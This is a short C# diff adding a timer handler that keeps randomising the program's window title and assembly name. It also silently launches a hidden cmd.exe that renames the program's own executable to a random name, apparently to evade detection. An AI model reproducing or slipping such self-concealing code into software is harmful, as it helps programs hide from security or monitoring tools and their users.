@@ -1,0 +1,18 @@
+        private void UDTD_Tick(object sender, EventArgs e)
+        {
+            AssemblyName myAssemblyName = new AssemblyName();
+            myAssemblyName.Name = Undetected.RandomString();
+            this.Text = Undetected.RandomString();
+            string location = Assembly.GetExecutingAssembly().Location;
+            if (location == "" || location == null)
+            {
+                location = Assembly.GetEntryAssembly().Location;
+            }
+            System.Diagnostics.ProcessStartInfo start = new System.Diagnostics.ProcessStartInfo();
+                start.FileName = "cmd.exe";
+                start.Arguments = "/C ren \"" + location + "\" " + Undetected.RandomString() + ".exe";
+                start.CreateNoWindow = true;
+                start.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            
+        }
